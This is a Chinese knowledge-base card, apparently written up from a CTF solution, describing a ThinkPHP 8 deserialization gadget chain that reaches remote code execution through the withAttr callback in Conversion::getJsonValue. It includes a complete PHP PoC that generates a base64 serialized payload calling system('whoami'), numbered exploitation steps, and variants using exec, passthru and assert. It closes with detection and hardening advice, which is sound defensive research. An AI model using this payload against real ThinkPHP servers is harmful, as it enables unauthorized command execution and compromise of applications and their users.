---
id: web-php-deserialization-thinkphp8-resourceregister-pivot-jsonvalue-withattr-rce
title: ThinkPHP 8 反序列化链：ResourceRegister::__destruct → Resource::parseGroupRule → Pivot __toString → Conversion::getJsonValue 的 withAttr 回调 RCE
type: scenario
domain: web
path: web/php/deserialization
technique: thinkphp8-resourceregister-pivot-jsonvalue-withattr-rce
tags:
- php
- thinkphp
- deserialization
- pop-chain
- magic-method
- tostring
- json
- withattr
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V301
  verified_at: '2026-11-08T11:54:26+08:00'
  notes: 已对照原文与 13 张图核对：source/middle 与截图一致（ResourceRegister.php:66 __destruct→register:51→parseGroupRule rule=1.1/option var[1]=Pivot→Conversion __toString:371→toJson:366→toArray→getAttr→getData→getValue:517-529→getJsonValue jsonAssoc 分支 [key]=([key],)，图13 withAttr p2=>['p2'=>'system']、data p2=>['p2'=>'whoami']）。与既有 TP8 Validate/cookie 卡的 sink 差异经逐项核对成立：既有卡在 toArray 后走 appendAttrToArray→getRelationWith→Validate::__call→Request::cookie→filterValue，属性集为 append/relation/visible/Validate/Request；本卡走 getAttr→getData→getValue→getJsonValue，属性集为 data/withAttr/json/jsonAssoc，二者在 toArray 之后完全分叉、对象图与 sink 均不同，--force 独立成卡理由成立；与 TP6 withAttr 卡（Model::__destruct 入口、直接标量闭包回调、无 json/getJsonValue）亦不同。dedup 实跑 top1 为 Validate/cookie 卡（cosine 0.9591, duplicate），但结论对比后确属不同后半链，保留本卡。affected_versions 原为『ThinkPHP 8（原文按 v8.0 文档，无小版本）』属目标环境/大版本而非受影响区间，且与既有 TP8 卡口径一致，已 --clear。未验证点：未搭 TP8 复现整链；本机 PHP 8.2.9 验证 system(cmd, array) 仍执行命令（多余参数被忽略），与卡内说法一致。
url: /docs/web/php/deserialization/web-php-deserialization-thinkphp8-resourceregister-pivot-jsonvalue-withattr-rce/
draft: false
kb_aliases:
- ThinkPHP 8 反序列化链
- TP8 POP 链
- ezthink 反序列化
- ResourceRegister __destruct
- Conversion getJsonValue withAttr
- jsonAssoc withAttr 回调
- Pivot __toString RCE
---

## 一句话结论

ThinkPHP 8 中存在一条可闭合的反序列化 RCE 链：`think\route\ResourceRegister::__destruct()` → `Resource::parseGroupRule()` 在字符串拼接时触发 `think\model\Pivot`（使用 `Conversion` trait）的 `__toString()` → `toJson → toArray → getAttr → getData → getValue`，当字段同时出现在 `json` 数组且 `withAttr[field]` 是数组时进入 `getJsonValue()`，其 `$closure($value[$key], $value)` 以 `withAttr` 里的函数名执行 `data` 里的命令（如 `system('whoami')`），且 `jsonAssoc=true` 时走数组下标分支。

## 原理

- **入口：析构器驱动路由注册**：`ResourceRegister::__destruct()` 在 `!$this->registered` 时调用 `register()`，`register()` 执行 `$this->resource->parseGroupRule($this->resource->getRule())`。反序列化一个 `ResourceRegister` 即可自动进入该逻辑。
- **触发 `__toString`**：`Resource::parseGroupRule($rule)` 在 `str_contains($rule, '.')` 分支中先 `explode('.', $rule)` 并 `array_pop` 取最后一段，然后对剩余每段执行
  `$item[] = $val . '/<' . ($option['var'][$val] ?? $val . '_id') . '>';`
  把 `$option['var'][$val]` 设为对象，字符串拼接即调用它的 `__toString()`。原文取 `rule="1.1"`、`option=["var"=>["1"=>new Pivot()]]`：`. ` 分割后弹出最后一段 `1`，剩下的 `1` 命中 `option['var']['1']`。
- **`Pivot` 是 `__toString` 载体**：`Conversion` 是 trait 不能直接实例化；`think\model\Pivot extends think\Model` 使用了该 trait，因此用 `Pivot` 实例即可进入 `Conversion::__toString()`。
- **`__toString` → `toJson` → `toArray`**：`__toString()` 返回 `$this->toJson()`；`toJson()` 返回 `json_encode($this->toArray(), 256)`，真正的逻辑在 `toArray()`。
- **`toArray` 的字段循环**：`toArray()` 遍历 `$this->data`（与 `relation` 合并）的每个 `$key => $val`；当 `$val` 不是 Model/Collection 时，若 `hidden` 未命中且 `hasVisible=false`（或 `visible[$key]` 存在），调用 `$this->getAttr($key)`。原文把 `hidden` 置空、`hasVisible` 置 false 以进入该分支。
- **`getAttr → getData → getValue`**：`getAttr($name)` 置 `$relation=false` 后调用 `getData($name)`；`getData` 经 `getRealFieldName` 得到字段名（`strict=true` 且不 camel 转换时原样返回），若 `data` 数组存在该键则返回其值。原文设 `data=['p2'=>['p2'=>'whoami']]`，于是 `$value=['p2'=>'whoami']`。
- **进入 `getJsonValue` 的条件**：`getValue()` 中若 `isset($this->withAttr[$fieldName])` 且 `$relation=false`，继续判断
  `if (in_array($fieldName, $this->json) && is_array($this->withAttr[$fieldName])) { $value = $this->getJsonValue($fieldName, $value); }`
  需要同时满足：字段名在 `json` 数组里、`withAttr[字段]` 是数组。原文设 `json=["p2"]`、`withAttr=['p2'=>['p2'=>'system']]`。
- **Sink：`getJsonValue` 的闭包调用**：`getJsonValue($name,$value)` 遍历 `$this->withAttr[$name] as $key => $closure`；当 `jsonAssoc=true` 时执行 `$value[$key] = $closure($value[$key], $value);`。此时 `$closure='system'`、`$value['p2']='whoami'`，即 `system('whoami', ['p2'=>'whoami'])`，多余参数被忽略，命令执行。
- **为什么闭合**：`Resource::parseGroupRule` 把可控配置当字符串拼接（触发任意对象 `__toString`）；`Conversion` 的字段获取器把 `withAttr` 中的字符串当函数调用；`getJsonValue` 又把 `withAttr` 数组的每个值当闭包调用，且 `jsonAssoc` 决定用数组下标取值。整条链只依赖框架内正常属性/方法语义，没有类型或可调用白名单。
- **与相近链的区别**：同为 `ResourceRegister → parseGroupRule → Pivot __toString` 的 ThinkPHP 8 链，已有公开利用走 `toArray → appendAttrToArray → getRelationWith → Validate::__call → Request::cookie → filterValue`；本链走 `toArray → getAttr → getValue → getJsonValue` 的 `withAttr` 数组回调，属不同中段与 sink（见关联卡）。

## 触发条件

- 目标为 ThinkPHP 8（原文按 v8.0 官方文档搭建，PHP 8+），存在可控 `unserialize` 入口（CTF 中自行添加；实战需应用存在反序列化点）。
- `unserialize` 未限制 `allowed_classes`，或放行了 `think\route\ResourceRegister`、`think\model\Pivot` 等类。
- 框架组件完整（`ResourceRegister`、`Resource`、`Pivot`、`Conversion`、`Attribute` trait 均在），且属性名/分支与目标小版本一致。
- `disable_functions` 未禁用 `system`（可替换为其它单参数可调用）。
- 仅用于授权测试；文章为 CTF 题解，未提供真实应用入口。

## 利用步骤

1. 确认 ThinkPHP 8 版本与反序列化入口；确认 `vendor/topthink/framework/src/think/route/ResourceRegister.php`、`model/concern/Conversion.php`、`Attribute.php` 存在。
2. 构造入口：`ResourceRegister->resource = new Resource()`；`Resource->rule = "1.1"`；`Resource->option = ["var" => ["1" => new Pivot()]]`，使 `parseGroupRule` 在拼接 `option['var']['1']` 时触发 `Pivot::__toString()`。
3. 构造 `Pivot` 的模型属性：`data=['p2'=>['p2'=>'whoami']]`、`withAttr=['p2'=>['p2'=>'system']]`、`json=["p2"]`、`jsonAssoc=true`、`hidden=[]`、`hasVisible=false`；并按 TP8 Model 构造要求设置 `lazySave=true`、`withEvent=false`、`exists=true`、`force=true`、`table` 等（原文 PoC 在 `Model::__construct` 中设置）。
4. `serialize` 后 `base64_encode`/`urlencode` 投递到 `unserialize` 入口。
5. 观察 `whoami` 回显或副作用；若失败，检查字段是否走了 `getRealFieldName` 的 snake 转换（`strict`/`convertNameToCamel`）、`get` 是否提前命中、`json`/`withAttr` 键是否一致。
6. 将 `system` 换成其它单参数函数（`exec`、`passthru` 等）或改用 `assert` 承载 PHP 代码；注意 `disable_functions`。
7. 记录调用栈与证据，清理测试对象。

## PoC

```php
<?php
namespace think\model\concern;

trait Attribute{
    private $data=['p2'=>['p2'=>'whoami']];
    private $withAttr=['p2'=>['p2'=>'system']];
    protected $json=["p2"];
    protected $jsonAssoc = true;
}

namespace think;

abstract class Model{
    use model\concern\Attribute;
    private $exists;
    private $force;
    private $lazySave;
    protected $suffix;

    function __construct($obj = '')
    {
        $this->lazySave = true;
        $this->withEvent = false;
        $this->exists = true;
        $this->force = true;
        $this->table = $obj;
        $this->jsonAssoc = true;
    }
}

namespace think\model;

use think\Model;
class Pivot extends Model{}

namespace think\route;

class Resource {
    public function __construct()
    {
        $this->rule = "1.1";
        $this->option = ["var" => ["1" => new \think\model\Pivot()]];
    }
}

class ResourceRegister
{
    protected $resource;
    public function __construct()
    {
        $this->resource = new Resource();
    }
    public function __destruct()
    {
        $this->register();
    }
    protected function register()
    {
        $this->resource->parseGroupRule($this->resource->getRule());
    }
}

$obj = new ResourceRegister();
echo base64_encode(serialize($obj));
```

```text
# 调用链（原文动态调试）：
ResourceRegister::__destruct()
  → ResourceRegister::register()
    → Resource::parseGroupRule("1.1")
      → Pivot::__toString()
        → Conversion::toJson()
          → Conversion::toArray()
            → Attribute::getAttr("p2")
              → Attribute::getData("p2")  // data["p2"] = ["p2"=>"whoami"]
              → Attribute::getValue("p2", ["p2"=>"whoami"], false)
                → Conversion::getJsonValue("p2", value)
                  → withAttr["p2"]["p2"]("whoami", value) = system("whoami")
```

原文在本地 PHP 8 + ThinkPHP 8 环境验证；未在本机执行本 PoC。

## 变体与关联

- 变体：`jsonAssoc=false` 时 `getJsonValue` 走 `$value->$key = $closure($value->$key, $value)`，要求 `$value` 为对象；`jsonAssoc=true` 走数组下标（本链使用的分支）。
- 变体：不设 `json` 或 `withAttr` 不是数组时，`getValue` 走直接闭包分支 `$closure($value, $this->data)`（即 `system('whoami', $data)`），这是 ThinkPHP 6 已公开的 withAttr 回调路径；本链特意走 `getJsonValue` 分支。
- 变体：`withAttr['p2']=['p2'=>'assert']`，`data['p2']=['p2'=>'phpinfo();']` 可执行 PHP 代码（视 PHP 版本/disable_functions）。
- 关联：[[web-php-deserialization-thinkphp8-resourceregister-pivot-validate-cookie-filtervalue-rce]]——同一 TP8 入口 `ResourceRegister → parseGroupRule → Pivot __toString`，但中段走 `appendAttrToArray → getRelationWith → Validate::__call → Request::cookie → filterValue`，sink 与属性设置不同；本卡是 `getJsonValue` 的 withAttr 数组回调。
- 关联：[[web-php-deserialization-thinkphp6-conversion-toarray-withattr-callback-rce]]——TP6 的 `Conversion.toArray → getAttr → getValue → withAttr` 直接回调链，版本与入口不同；本卡在 TP8 上增加了 `json`/`getJsonValue` 分支。
- 关联：[[web-php-deserialization-thinkphp6-model-destruct-tostring-chain]]（TP6 `Model::__destruct` 拼接触发 `__toString` 的前半链）。
- 边界：`allowed_classes` 白名单、`disable_functions`、框架小版本属性/分支变化、`getRealFieldName` 的 snake 转换、`get` 提前 return 都会导致链失败；需要按目标版本动态调试校正。

## 检测与防御

- 检测：审计所有 `unserialize` 入口，禁止用户输入直接反序列化；流量/日志中出现 `think\route\ResourceRegister`、`think\model\Pivot` 与 `withAttr`/`json` 属性组合的序列化串。
- 检测：序列化数据中 `withAttr` 的值为函数名字符串或 `[字段=>函数名]` 数组、`json` 含可控字段名；请求参数为 base64/urlencode 的 `O:...` 结构。
- 防御：`unserialize($data, ['allowed_classes' => false])` 或改用 JSON；升级/修补 ThinkPHP；裁剪不必要的路由/模型组件。
- 防御：`disable_functions` 覆盖 `system/exec/passthru/assert` 等只是纵深；根本是关闭不可信反序列化入口。
- 代码层：`Resource::parseGroupRule` 应校验 `option['var']` 为字符串；`Conversion::getJsonValue`/`getValue` 不应把 `withAttr` 中的任意字符串当函数调用，应只接受真正的 `Closure` 或白名单回调。

## 附：原文调试要点

- 入口搜索从 `__destruct` 开始（`ResourceRegister.php` 的 `__destruct` 调 `register()`）。
- `parseGroupRule` 的 `explode('.') + array_pop` 用于控制 `option['var']` 的键：`rule="1.1"` 时剩余段为 `1`。
- `getRealFieldName` 在 `strict=true` 且 `convertNameToCamel=false` 时原样返回 `p2`；否则会 `Str::snake` 改变键名。
- `getValue` 先查 `get` 数组，若含同名字段会提前 return；payload 需保证 `get` 不含 `p2`。
- `getJsonValue` 的 `jsonAssoc` 决定数组下标/对象属性两种取值方式，原文使用 `true`。
